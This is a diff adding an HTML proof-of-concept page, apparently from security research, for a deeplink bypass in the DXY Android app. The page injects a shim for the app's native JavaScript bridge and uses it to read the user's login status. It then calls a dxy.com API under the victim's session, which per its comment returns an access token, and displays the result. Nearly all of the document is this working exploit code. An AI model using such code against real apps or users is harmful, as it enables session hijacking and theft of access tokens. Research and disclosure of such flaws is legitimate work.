@@ -1,1 +1,42 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>DXY PoC</title></head>
+<body style="font:15px monospace;white-space:pre-wrap;padding:10px;background:#fff">
+<h3>★ DXY deeplink bypass PoC — bridge injected</h3>
+<div id="o">init...</div>
+<script>
+var o = document.getElementById('o');
+function L(s){ o.textContent += '\n' + s; }
 
+// ===== 自实现 shim (原生回调走 window.DXYJSBridge.callback, 见 q/r.java:63) =====
+window.DXYJSBridge = {
+  queue: [],
+  invoke: function(method, params, cb) {
+    this.queue.push(cb);
+    try { AndroidJSBridger.invoke(method, JSON.stringify(params || {}), this.queue.length - 1); }
+    catch(e) { L('[invoke ' + method + ' err] ' + e); }
+  },
+  callback: function(res, position) {
+    try { if (this.queue[position]) this.queue[position](typeof res === 'string' ? JSON.parse(res) : res); }
+    catch(e) { L('[cb err] ' + e); }
+  }
+};
+
+L('href: ' + location.href);
+L('AndroidJSBridger: ' + (typeof window.AndroidJSBridger));
+L('----------------------------------------');
+
+// 1) loginStatus → 用户身份
+DXYJSBridge.invoke('loginStatus', {}, function(res) {
+  L('[loginStatus] ' + JSON.stringify(res));
+});
+
+// 2) getServerData → 以用户登录态调 API, 响应含 access token
+DXYJSBridge.invoke('getServerData', {
+  method: 'get',
+  url: 'https://dxy.com/app/i/user/ask/att/upload/access',
+  params: {}
+}, function(res) {
+  L('[accessToken API] ' + JSON.stringify(res).substring(0, 800));
+});
+</script>
+</body></html>
